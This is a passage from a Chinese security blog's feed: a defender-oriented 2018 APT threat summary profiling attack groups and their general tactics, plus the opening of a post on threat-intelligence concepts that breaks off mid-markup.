路径信息。<strong>该组织使用的攻击载荷使用了多种语言开发，包括C++、.NET、Python、VBS 和AutoIt</strong>。</p><p>360 威胁情报中心发现了该组织以“克什米尔问题”命名的<strong>诱饵漏洞文档，该文档利用了CVE-2017-8570 漏洞</strong>，其主要的攻击流程如下图。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B31.jpg" alt="此处输入图片的描述"></p><p>后续又发现该组织利用<strong>内嵌有恶意宏代码的 Excel 文档</strong>针对中国境内的巴基斯坦重要商务人士实施的攻击<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B33.jpg" target="_blank" rel="noopener">6</a>，并向被控主机下发了多种载荷模块文件。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B32.jpg" alt="此处输入图片的描述"></p><h3 id="5-蔓灵花"><a href="#5-蔓灵花" class="headerlink" title="5.蔓灵花"></a><strong>5.蔓灵花</strong></h3><p>蔓灵花组织主要使用鱼叉邮件向目标人员投放<strong>漏洞利用文档</strong>，其中包括针对 <strong>Office 的漏洞文档和InPage 文字处理软件的漏洞文档</strong>（InPage 是一个专门针对乌尔都语使用者，即巴基斯坦国语设计的文字处理软件）。</p><p>该组织主要使用鱼叉钓鱼进行攻击，投递伪装成word图标的自解压文件：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B311.jpg" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B312.jpg" alt="此处输入图片的描述"></p><p>运行后，除了会执行恶意文件外，还会打开一个doc文档，用于迷惑用户，让用户以为打开的文件就是一个doc文档。诱饵文档内容极尽诱惑力：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B313.jpg" alt="此处输入图片的描述"></p><p>最终会下发键盘记录、上传文件、远控等插件，完成资料的窃取工作。</p><h3 id="6-Group-123-APT37"><a href="#6-Group-123-APT37" class="headerlink" title="6.Group 123(APT37)"></a><strong>6.Group 123(APT37)</strong></h3><p>Group 123 组织早期的攻击活动主要针对韩国，2017 年后延伸攻击目标至半岛范围，包括日本，越南和中东。其主要针对工业垂直领域，包括化学品、电子、制造、航空航天、汽车和医疗保健实体。360 威胁情报中心也曾发现该组织针对中国境内目标的攻击活动。</p><p>该组织在过去实施的攻击活动中主要<strong>以情报窃取为意图</strong>，并呈现出一些其<strong>特有的战术技术特点</strong>，包括：<br>1） 同时拥有对 PC（Windows） 和 Android 终端的攻击武器；<br>2） 对韩国网站实施入侵并作为攻击载荷分发和控制回传渠道，或者使用云盘，如 Yandex、Dropbox 等作为攻击载荷分发和控制回传渠道；<br>3） 使用 HWP 漏洞对韩国目标人员实施鱼叉攻击。</p><h2 id="0X03-针对中国境内的APT-组织和威胁"><a href="#0X03-针对中国境内的APT-组织和威胁" class="headerlink" title="0X03 针对中国境内的APT 组织和威胁"></a><strong>0X03 针对中国境内的APT 组织和威胁</strong></h2><h3 id="1-海莲花（APT-C-00）"><a href="#1-海莲花（APT-C-00）" class="headerlink" title="1.海莲花（APT-C-00）"></a><strong>1.海莲花（APT-C-00）</strong></h3><p>在2018 年中的全球高级持续性威胁报告中，我们总结了该组织使用的攻击战术和技术特点，包括使用开源的代码和公开的攻击工具，如Cobalt Strike。</p><p>“海莲花”在2018 年的攻击活动中使用了<strong>更加多样化的载荷投放形式</strong>，并使用<strong>多种白利用技术</strong>加载其恶意模块。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B33.jpg" alt="此处输入图片的描述"></p><p>还使用一些脚本技术</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B37.jpg" alt="此处输入图片的描述"></p><p>最终在内存中调用loader类，加载最终的由CobaltStrike生成的beacon.dll木马：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B38.jpg" alt="此处输入图片的描述"></p><p><strong>该组织在近期活动中主要的攻击过程如下</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B34.jpg" alt="此处输入图片的描述"></p><h3 id="2-毒云藤（APT-C-01）"><a href="#2-毒云藤（APT-C-01）" class="headerlink" title="2.毒云藤（APT-C-01）"></a><strong>2.毒云藤（APT-C-01）</strong></h3><p>毒云藤（APT-C-01），也被国内其他安全厂商称为穷奇、绿斑。该组织从2007 年开始至今，对中国国防、政府、科技、教育以及海事机构等重点单位和部门进行了长达11 年的网络间谍活动。<strong>该组织主要关注军工、中美关系、两岸关系和海洋相关领域。</strong></p><p>该组织主要使用<strong>鱼叉攻击投放漏洞文档或二进制可执行文件</strong>。下面两图为我们截获的该组织鱼叉邮件内容。<br>毒云藤组织主要使用的恶意木马包括Poison Ivy，ZxShell，XRAT 等，并<strong>使用动态域名，云盘，第三方博客作为其控制回传的基础设施</strong></p><h3 id="3-蓝宝菇（APT-C-12）"><a href="#3-蓝宝菇（APT-C-12）" class="headerlink" title="3.蓝宝菇（APT-C-12）"></a><strong>3.蓝宝菇（APT-C-12）</strong></h3><p>蓝宝菇（APT-C-12）组织的活动最早从2011 年开始并持续至今<strong>，对我国政府、军工、科研、金融等重点单位和部门进行了持续的网络间谍活动</strong>。</p><p>该组织主要关注核工业和科研等相关信息。被攻击目标主要集中在中国大陆境内。在2018 年中的高级持续性威胁报告中曾对该组织进行了介绍。蓝宝菇组织也主要使用<strong>鱼叉邮件实施攻击，其投放的文件主要是RLO伪装成文档的可执行文件或LNK 格式文件</strong>。</p><p>该组织主要使用<strong>动态域名或IDC IP 最为其控制基础设施</strong>，<strong>后续也常使用AWSS3、新浪云等云服务</strong>作为其上传和托管窃取的数据。其常使用的恶意程序包括<strong>Poison Ivy、Bfnet，以及PowerShell 实现的后门。</strong></p><p>蓝宝菇和毒云藤两个组织从攻击来源来源来看，属于同一地域，但使用的TTP(策略技术流程)却存在一些差异。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B35.jpg" alt="此处输入图片的描述"></p><h3 id="4-Darkhotel（APT-C-06）"><a href="#4-Darkhotel（APT-C-06）" class="headerlink" title="4.Darkhotel（APT-C-06）"></a><strong>4.Darkhotel（APT-C-06）</strong></h3><p>趋势科技在2018 年7 月公开捕获了又一例<strong>VBScript Engine 的在野0day漏洞</strong>（CVE-2018-8373）攻击样本。360 威胁情报中心结合内部的威胁情报数据关联到该在野攻击与 Darkhotel 有关，该组织在2018 年多次利用 VBScript Engine 的相关0day 漏洞实施在野攻击活动。</p><p><strong>该组织的一大特色是喜欢把木马隐藏在开源的代码中进行伪装</strong>，如putty、openssl、zlib等，把少量木马代码隐藏在大量的开源代码中，从而实现躲避检测的目的，<strong>因此将被称为“寄生兽”。</strong></p><p>如使用msfte.dll和msTracer.dll，来进行持久性攻击，并把下发的shellcode隐藏在图片文件中</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B39.jpg" alt="此处输入图片的描述"></p><p>同时通过下发插件的方式，完成相关的任务：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B310.jpg" alt="此处输入图片的描述"></p><p><strong>该组织的具体攻击流程如下图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B36.jpg" alt="此处输入图片的描述"></p><h2 id="0X04-APT-威胁的现状和挑战"><a href="#0X04-APT-威胁的现状和挑战" class="headerlink" title="0X04 APT 威胁的现状和挑战"></a><strong>0X04 APT 威胁的现状和挑战</strong></h2><h3 id="1-进化中的APT-攻防"><a href="#1-进化中的APT-攻防" class="headerlink" title="1.进化中的APT 攻防"></a><strong>1.进化中的APT 攻防</strong></h3><p>APT 组织也不再局限于其过去固有的攻击模式和武器，APT 组织不仅需要达到最终的攻击效果，还刻意避免被防御方根据留下的痕迹和特征追溯到其组织身份(false flag)。</p><h4 id="1-常见的APT攻击方式"><a href="#1-常见的APT攻击方式" class="headerlink" title="(1)常见的APT攻击方式"></a><strong>(1)常见的APT攻击方式</strong></h4><h5 id="1-鱼叉攻击"><a href="#1-鱼叉攻击" class="headerlink" title="1.鱼叉攻击"></a><strong>1.鱼叉攻击</strong></h5><p>2018年，<strong>鱼叉攻击依然是APT攻击的最主要方式</strong>，使用<strong>鱼叉结合社工类的方式，投递带有恶意文件的附件，诱使被攻击者打开</strong>。虽然该方式攻击成本极低，但是效果却出人意料的好。这也进一步体现了被攻击目标的人员的安全意识亟需加强。从曝光的APT活动来看，2018年使用鱼叉攻击的APT活动比例高达95%以上。</p><h5 id="2-水坑攻击"><a href="#2-水坑攻击" class="headerlink" title="2.水坑攻击"></a><strong>2.水坑攻击</strong></h5><p><strong>水坑攻击也是APT组织常用的攻击手段</strong>，2018年，海莲花、socketplayer等组织均使用过该攻击方式。除了插恶意代码外，<strong>攻击者还会判断访问该页面的访问者的ip，只有当访问者在攻击目标的ip范围内，才会进行下一步的攻击动作，依次来防止误伤</strong>。</p><h5 id="3-远程可执行漏洞和密码爆破攻击"><a href="#3-远程可执行漏洞和密码爆破攻击" class="headerlink" title="3.远程可执行漏洞和密码爆破攻击"></a><strong>3.远程可执行漏洞和密码爆破攻击</strong></h5><p>除了鱼叉和水坑攻击，利用远程可执行漏洞和服务器口令爆破进行攻击，也成为了一种可选的攻击方式。如专业黑客组织针对驱动人生公司的攻击，该黑客组织得手后已对普通网民产生极大威胁。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B314.jpg" alt="此处输入图片的描述"></p><h4 id="2-APT攻击的技术趋势"><a href="#2-APT攻击的技术趋势" class="headerlink" title="(2)APT攻击的技术趋势"></a><strong>(2)APT攻击的技术趋势</strong></h4><h5 id="1-Fileless攻击（无文件攻击）越来越多"><a href="#1-Fileless攻击（无文件攻击）越来越多" class="headerlink" title="1.Fileless攻击（无文件攻击）越来越多"></a><strong>1.Fileless攻击（无文件攻击）越来越多</strong></h5><p>随着各安全厂商对PE文件的检测和防御能力不断的增强，A<strong>PT攻击者越来越多的开始使用无PE文件落地的攻击方式进行攻击</strong>。其主要特点是<strong>没有长期驻留在磁盘的文件、核心payload存放在网络或者注册表</strong>中，启动后通过系统进程<strong>拉取payload执行</strong>。该方式大大增加了客户端安全软件基于文件扫描的防御难度。海莲花、污水（MuddyWater）、APT29、FIN7等攻击组织都擅长使用该方式进行攻击。</p><p>如海莲花组织事先的通过计划任务执行命令，全程无文件落地：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B315.jpg" alt="此处输入图片的描述"></p><h5 id="2-C-amp-C存放在公开的社交网站上"><a href="#2-C-amp-C存放在公开的社交网站上" class="headerlink" title="2.C&amp;C存放在公开的社交网站上"></a><strong>2.C&amp;C存放在公开的社交网站上</strong></h5><p><strong>通信跟数据回传是APT攻击链中非常重要的环节</strong>，因此如何使得通信的C&amp;C服务器被防火墙发现成为了攻击者的难题。因此，<strong>除了注册迷惑性极强的域名、使用DGA、隐蔽信道等方式外，攻击者把目光集中到了公开的社交网络上，如youtube、github、twitter等上。</strong></p><p>如某次针对英国和瑞士的攻击，C&amp;C存放地址：</p><p>YouTube：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B316.jpg" alt="此处输入图片的描述"></p><p> Twitter：</p><p> <img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B317.jpg" alt="此处输入图片的描述"></p><p> Wordpress博客：</p><p> <img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B318.jpg" alt="此处输入图片的描述"></p><p> Google plus：</p><p> <img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B319.jpg" alt="此处输入图片的描述"></p><h5 id="3-公开或者开源工具的使用"><a href="#3-公开或者开源工具的使用" class="headerlink" title="3.公开或者开源工具的使用"></a><strong>3.公开或者开源工具的使用</strong></h5><p>往往，APT组织都有其自己研发的特定的攻击武器库，但是随着安全厂商对APT组织研究的深入，APT组织开始使<strong>用一些公开或者开源的工具来进行攻击，以此来增加溯源以及被发现的难度。</strong></p><p>如SYSCON/KONNI，使用开源的babyface木马和无界面的teamview（著名远程控制工具）来进行攻击：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B320.jpg" alt="此处输入图片的描述"></p><h5 id="4-多平台攻击和跨平台攻击"><a href="#4-多平台攻击和跨平台攻击" class="headerlink" title="4.多平台攻击和跨平台攻击"></a><strong>4.多平台攻击和跨平台攻击</strong></h5><p>移动互联网的成熟，使得人们已经很少在工作之余使用电脑，因此<strong>使用移动端来进行攻击，也越来越被APT攻击组织使用</strong>。此外Mac OS的流行，也是的APT攻击者也开始对MacOS平台进行攻击。如“人面马”(APT34)、蔓灵花、Group123、双尾蝎（APT-C-23）、黄金鼠（APT-C-27）等组织都擅长使用多平台攻击。此外黄金鼠（APT-C-27）还使用了在APK中打包了PE文件，运行后释放到移动端外置存储设备中的图片目录下，从而实现跨平台的攻击：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B321.jpg" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B322.jpg" alt="此处输入图片的描述"></p><h3 id="2-多样化的攻击投放方式"><a href="#2-多样化的攻击投放方式" class="headerlink" title="2.多样化的攻击投放方式"></a><strong>2.多样化的攻击投放方式</strong></h3><h4 id="1-文档投放的形式多样化"><a href="#1-文档投放的形式多样化" class="headerlink" title="(1)文档投放的形式多样化"></a><strong>(1)文档投放的形式多样化</strong></h4><p>在过去的APT 威胁或者网络攻击活动中，利用邮件投递恶意的文档类载荷是非常常见的一种攻击方式，例如<strong>鱼叉邮件攻击或BEC 攻击，垃圾邮件攻击等</strong>。而<strong>通常投放的文档大多为Office 文档类型，如doc、docx，xls，xlsx 等。</strong></p><p>针对特定地区、特定语言或者特定行业的目标人员，攻击者可能会投放一些其他的文档类型载荷，例如<strong>针对韩国人员投放HWP 文档</strong>，<strong>针对巴基斯坦地区投放InPage 文档</strong>，或者针对<strong>工程建筑行业人员投放恶意的<br>AutoCAD</strong> 文档等等。</p><p>攻击者也可能使用一些<strong>其他扩展名的文档类型</strong>并同样可以被Office 应用打开<strong>，如.iqy，</strong>虽然其在APT 威胁中不是很常见，但已经应用在一些更广泛的垃圾邮件攻击活动中。</p><h4 id="2-利用文件格式的限制"><a href="#2-利用文件格式的限制" class="headerlink" title="(2)利用文件格式的限制"></a><strong>(2)利用文件格式的限制</strong></h4><p>APT 攻击者通常会利用一些文件格式和<strong>显示上的特性</strong>用于<strong>迷惑受害用户或安全分析人员</strong>。这里以LNK 文件为例。<strong>LNK 文件显示的目标执行路径仅260 个字节，多余的字符将被截断</strong>，</p><p>而在跟踪蓝宝菇的攻击活动中，<strong>该组织投放的LNK 文件在目标路径字符串前面填充了大量的空字符，所以直接查看无法明确其执行的内容，需要解析LNK 文件结构获取</strong>,APT29 也常用这种方式执行PowerShell 脚本</p><h4 id="3-利用新的系统文件格式特性"><a href="#3-利用新的系统文件格式特性" class="headerlink" title="(3)利用新的系统文件格式特性"></a><strong>(3)利用新的系统文件格式特性</strong></h4><p>2018 年6 月，国外安全研究人员公开了利用<strong>Windows 10 下才被引入的新文件类型“.SettingContent-ms”执行任意命令的攻击技巧</strong>，并公开了POC。而该新型攻击方式被公开后就立刻<strong>被黑客和APT组织纳入攻击武器库用于针对性攻击，并衍生出各种利用方式</strong>：诱导执行、利用Office 文档执行、利用PDF 文档执行。</p><h4 id="4-利用旧的技术实现攻击"><a href="#4-利用旧的技术实现攻击" class="headerlink" title="(4)利用旧的技术实现攻击"></a><strong>(4)利用旧的技术实现攻击</strong></h4><p>一些被认为<strong>陈旧而古老的文档特性可以被实现并用于攻击</strong>，360 威胁情报中心在2018 年就针对利用Excel 4.0 宏传播商业远控木马的在野攻击样本进行了分析。该技术最早是于2018 年10 月6 日由国外安全厂商Outflank的安全研究人员首次公开，并展示了使用Excel 4.0 宏执行ShellCode 的利用<br>代码<strong>。Excel 4.0 宏是一个很古老的宏技术，微软在后续使用VBA 替换了该特性，但从利用效果和隐蔽性上依然能够达到不错的效果</strong></p><h3 id="3-0day-漏洞和在野利用"><a href="#3-0day-漏洞和在野利用" class="headerlink" title="3.0day 漏洞和在野利用"></a><strong>3.0day 漏洞和在野利用</strong></h3><p>0day 漏洞的在野利用，一般是指攻击活动被捕获时，发现其利用了某些0day 漏洞（攻击活动与攻击样本分析本身也是0day 漏洞发现的重要方法之一）。而在所有有能力挖掘和利用0day 漏洞的组织中，<strong>APT 组织首当其冲。</strong></p><p>0day 漏洞在野利用的频频现身，事实上是在<strong>倒逼安全企业必须打破传统的攻防理念</strong>，实现安全能力的大幅提升与技术体系的全面升级。这主要表现在两个方面：</p><h4 id="1-安全企业必须在漏洞挖掘和攻防能力建设上进行持续的投入"><a href="#1-安全企业必须在漏洞挖掘和攻防能力建设上进行持续的投入" class="headerlink" title="(1)安全企业必须在漏洞挖掘和攻防能力建设上进行持续的投入"></a><strong>(1)安全企业必须在漏洞挖掘和攻防能力建设上进行持续的投入</strong></h4><p>从某种程度上来说，0day 漏洞的独立发现能力，已经成为APT 研究的必备技能，也是衡量安全厂商在APT 方面攻防水平的重要指标之一。</p><h4 id="2-大数据和威胁情报能力将成为新型IT-基础设施安全体系建设的关键"><a href="#2-大数据和威胁情报能力将成为新型IT-基础设施安全体系建设的关键" class="headerlink" title="(2)大数据和威胁情报能力将成为新型IT 基础设施安全体系建设的关键"></a><strong>(2)大数据和威胁情报能力将成为新型IT 基础设施安全体系建设的关键</strong></h4><p>因为从理论上说，<strong>0day 漏洞利用是不可防御的</strong>；既然防不住，<strong>就应该更多的从快速发现、快速响应来着手</strong>建设新的安全体系，而大数据和威胁情报能力正是这种体系的核心和关键。</p><h2 id="0X05-APT-威胁到归属挑战"><a href="#0X05-APT-威胁到归属挑战" class="headerlink" title="0X05 APT 威胁到归属挑战"></a><strong>0X05 APT 威胁到归属挑战</strong></h2><p>APT 威胁活动的归属分析一直是APT 威胁分析中最为重要的一个环节，目前，<strong>绝大多数安全机构在做APT 活动的归属分析时，主要的判断依据包括以下几点：</strong></p><p>1） APT 组织使用的<strong>恶意代码特征的相似度</strong>，如包含特有的元数据，互斥量，加密算法，签名等等。<br>2） APT 组织历史使用<strong>控制基础设施的重叠</strong>，本质即pDNS 和whois 数据的重叠。<br>3） APT 组织使用的<strong>攻击TTP</strong>。<br>4） 结合攻击留下的线索中<strong>的地域和语言特征，或攻击针对的目标和意图</strong>，推测其攻击归属的APT 组织<br>5） <strong>公开情报</strong>中涉及的归属判断依据</p><p>但APT <strong>攻击者会尝试规避和隐藏攻击活动中留下的与其角色相关的线索，或者通过false flag（假旗行动）和模仿其他组织的特征来迷惑分析人员</strong>。针对韩国平昌奥运会的攻击组织Hades 就是一个最好的说明。</p><h2 id="0X06-APT-威胁的演变趋势"><a href="#0X06-APT-威胁的演变趋势" class="headerlink" title="0X06 APT 威胁的演变趋势"></a><strong>0X06 APT 威胁的演变趋势</strong></h2><p>从2018 年的APT 威胁态势来看，我们推测APT 威胁<strong>活动的演变趋势可能包括如下几个方面：</strong></p><p>1） <strong>APT 组织可能发展出更加明确的组织化特点</strong>，例如小组化，各个攻击小组可能针对特定行业实施攻击并达到特定的攻击目的，但其整体可能共享部分攻击代码或资源。</p><p>2） APT 组织在初期的攻击尝试和获得初步控制权阶段可能<strong>更倾向于使用开源或公开的攻击工具或系统工具，只有对高价值目标或为维持长久性的控制时，才会使用其自身特有的成熟的攻击代码。</strong></p><p>3） APT 组织针对的目标行业可能进一步<strong>延伸到一些传统行业或者和国家关键信息基础建设相关的行业和机构。</strong>随着这些行业逐渐的互联化和智能化，其安全防御上的弱点将会被越来越多的利用，供应链攻击也会越来越频繁。</p><p>4） <strong>APT 组织会进一步加强0day漏洞能力的储备</strong>，并且可能覆盖多个平台，包括PC，服务器，移动终端，路由器，甚至<strong>工控设备</strong>等。</p><h2 id="0X07-参考链接"><a href="#0X07-参考链接" class="headerlink" title="0X07 参考链接"></a><strong>0X07 参考链接</strong></h2><p><a href="https://s.tencent.com/research/report/623.html" target="_blank" rel="noopener">https://s.tencent.com/research/report/623.html</a><br><a href="http://zt.360.cn/1101061855.php?dtid=1101062514&amp;did=210827151" target="_blank" rel="noopener">http://zt.360.cn/1101061855.php?dtid=1101062514&amp;did=210827151</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0X01-概念：&quot;&gt;&lt;a href=&quot;#0X01-概念：&quot; class=&quot;headerlink&quot; title=&quot;0X01 概念：&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X01 概念：&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;APT，又称&lt;strong&gt;高级持续性威胁&lt;/strong&gt;，通常&lt;strong&gt;用于区分由国家、政府或情报机构资助或具有相关背景的攻击团伙实施的攻击行动&lt;/strong&gt;。该类攻击行动的动机往往与地缘&lt;strong&gt;政治冲突，军事行动&lt;/strong&gt;相关，并以&lt;strong&gt;长久性的情报刺探、收集和监控&lt;/strong&gt;为主要意图，其主要攻击的目标除了&lt;strong&gt;政府、军队、外交相关部门外，也包括科研、海事、能源、高新技术&lt;/strong&gt;等领域。 &lt;/p&gt;
&lt;h2 id=&quot;0X02-高级持续性威胁背后的攻击者&quot;&gt;&lt;a href=&quot;#0X02-高级持续性威胁背后的攻击者&quot; class=&quot;headerlink&quot; title=&quot;0X02 高级持续性威胁背后的攻击者&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X02 高级持续性威胁背后的攻击者&lt;/strong&gt;&lt;/h2&gt;&lt;h3 id=&quot;1-APT28&quot;&gt;&lt;a href=&quot;#1-APT28&quot; class=&quot;headerlink&quot; title=&quot;1.APT28&quot;&gt;&lt;/a&gt;&lt;strong&gt;1.APT28&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Zebrocy 是APT28 专用的攻击工具集&lt;/strong&gt;，主要目的是用作侦察（收集上传系统信息和截屏）和部署下一阶段的攻击载荷。Zebrocy 包含了.NET、AutoIT、Delphi、C++、PowerShell 和Go 等多种语言开发形态。安全厂商也发现该组织使用新的攻击恶意代码Cannon，&lt;strong&gt;其使用邮件协议作为C2的通信方式。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;2-APT29&quot;&gt;&lt;a href=&quot;#2-APT29&quot; class=&quot;headerlink&quot; title=&quot;2.APT29&quot;&gt;&lt;/a&gt;&lt;strong&gt;2.APT29&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;其实施鱼叉攻击是用于投放恶意的LNK文件，其中利用了该组织特有的一种LNK文件格式的利用技术。该组织木马会执行内嵌的PowerShell脚本命令,&lt;strong&gt;并从LNK 文件附加的数据中解密释放恶意载荷和诱导的PDF 文档文件&lt;/strong&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="APT" scheme="https://www.k0rz3n.com/categories/APT/"/>
    
    
      <category term="APT" scheme="https://www.k0rz3n.com/tags/APT/"/>
    
  </entry>
  
  <entry>
    <title>威胁情报概念与APT事件分析模型概述</title>
    <link href="https://www.k0rz3n.com/2019/03/19/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E6%A6%82%E5%BF%B5%E4%B8%8EAPT%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90%E6%A8%A1%E5%9E%8B%E6%A6%82%E8%BF%B0/"/>
    <id>https://www.k0rz3n.com/2019/03/19/威胁情报概念与APT事件分析模型概述/</id>
    <published>2019-03-19T11:28:18.000Z</published>
    <updated>2019-04-28T15:45:55.632Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0X01-基本信息："><a href="#0X01-基本信息：" class="headerlink" title="0X01 基本信息："></a><strong>0X01 基本信息：</strong></h2><h3 id="1-威胁情报的定义："><a href="#1-威胁情报的定义：" class="headerlink" title="1.威胁情报的定义："></a><strong>1.威胁情报的定义：</strong></h3><p>威胁情报是关于IT或信息资产所面临的<strong>现有</strong>或<strong>潜在</strong>威胁的循证知识，包括情境、机制、指标、推论与可行建议，这些知识可为威胁响应提供决策依据。</p><h3 id="2-分类"><a href="#2-分类" class="headerlink" title="2.分类"></a><strong>2.分类</strong></h3><p>按照不同标准威胁情报有多种不同的分类方式，首先根据数据本身威胁情报可以分<strong>为HASH值</strong>、<strong>IP地址</strong>、<strong>域名</strong>、<strong>网络或主机特征</strong>、<strong>TTPs（Tactics、Techniques &amp; Procedures）</strong>这几种，其源于David J. Bianco在《The Pyramid of Pain》一文中提出的威胁情报相关指标（单一的信息或数据一般算不上威胁情报，经过分析处理过的有价值的信息才称得上威胁情报）的金字塔模型。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A52.png" alt="此处输入图片的描述"></p><a id="more"></a><p>左侧是能够利用的情报，右侧是这些情报给攻击者造成的困难程度。一般来说情报中价值最低的是Hash值、IP地址和域名（也就是常说的信誉库），其次是网络/主机特征、攻击工具特征，对攻击者影响最大的是TTPs（战术、技术和行为模式）类型的威胁情报。这里分别做个简单介绍：</p><p><strong>HASH值：</strong>一般指样本、文件的HASH值，比如MD5和SHA系列。由于HASH函数的雪崩效应，文件任何微弱地改变，都会导致产生一个完全不同也不相关的哈希值。这使得在很多情况下，它变得不值得跟踪，所以它带来的防御效果也是最低的。</p><p><strong>IP地址：</strong>常见的指标之一，通过IP的访问控制可以抵御很多常见的攻击，但是又因为IP数量太大，任何攻击者均可以尝试更改IP地址，以绕过访问控制。</p><p><strong>域名：</strong>有些攻击类型或攻击手法也或者出于隐藏的目的，攻击者会通过域名连接外部服务器进行间接通信，由于域名需要购买、注册、与服务器绑定等操作使得它的成本相对IP是比较高的，对域名的把控产生的防御效果也是较好的。但是对于高级APT攻击或大规模的团伙攻击，往往会准备大量备用域名，所以它的限制作用也是有限。</p><p><strong>网络或主机特征：</strong>这里指的特征可以是很多方面，比如攻击者浏览器的User-Agent、登录的用户名、访问的频率等，这些特征就是一种对攻击者的描述，这些情报数据可以很好的将攻击流量从其他的流量中提取出来，就会产生一种较好的防御效果。</p><p><strong>攻击工具：</strong>这里是指获取或检测到了攻击者使用的工具，这种基于工具的情报数据能够使得一批攻击失效，攻击者不得不进行免杀或重写工具，这就达到了增加攻击成本的目的。</p><p><strong>TTPs</strong>：Tactics、Techniques &amp; Procedures的缩写，这里是指攻击者所使用的攻击策略、手法等，掌握了些信息就能明白攻击者所利用的具体漏洞，就能够针对性的布防，使得攻击者不得不寻找新的漏洞，所以这也是价值最高的情报数据。</p><p><strong>按照传统的分类方法威胁情报分为以下三类</strong></p><p><strong>战术级情报：</strong>战术情报的作用主要是发现威胁事件以及对报警确认或优先级排序。常见的失陷检测情报（CnC 情报，即攻击者控制被害主机所使用的远程命令与控制服务器情报）、IP情报就属于这个范畴，它们都是可机读的情报，可以直接被设备使用，自动化的完成上述的安全工作。</p><p><strong>运营级情报：</strong>运营级情报是给安全分析师或者说安全事件响应人员使用的，目的是对已知的重要安全事件做分析（报警确认、攻击影响范围、攻击链以及攻击目的、技战术方法等）或者利用已知的攻击者技战术手法主动的查找攻击相关线索。</p><p><strong>战略级情报：</strong>战略层面的威胁情报是给组织的安全管理者使用的，比如CSO。它能够帮助决策者把握当前的安全态势，在安全决策上更加有理有据。包括了什么样的组织会进行攻击，攻击可能造成的危害有哪些，攻击者的战术能力和掌控的资源情况等，当然也会包括具体的攻击实例。</p><h3 id="3-意义"><a href="#3-意义" class="headerlink" title="3.意义"></a><strong>3.意义</strong></h3><p>传统的防御机制根据以往的“经验”构建防御策略、部署安全产品，难以应对未知攻击；即使是基于机器学习的检测算法也是在过往“经验”（训练集）的基础寻找最佳的一般表达式，以求覆盖所有可能的情况，实现对未知攻击的检测。但是过往经验无法完整的表达现在和未来的安全状况，而且攻击手法变化多样，防御技术的发展速度本质上落后与攻击技术的发展速度。所以需要一种能够根据过去和当前网络安全状况动态调整防御策略的手段，威胁情报应运而生。<strong>通过对威胁情报的收集、处理可以直接将相应的结果分发到安全人员（认读）和安全设备（机读），实现精准的动态防御，达到“未攻先防”的效果。</strong></p><h2 id="0X02-APT-事件的分析与防御"><a href="#0X02-APT-事件的分析与防御" class="headerlink" title="0X02 APT 事件的分析与防御"></a><strong>0X02 APT 事件的分析与防御</strong></h2><h3 id="1-威胁情报在事件分析中的定位"><a href="#1-威胁情报在事件分析中的定位" class="headerlink" 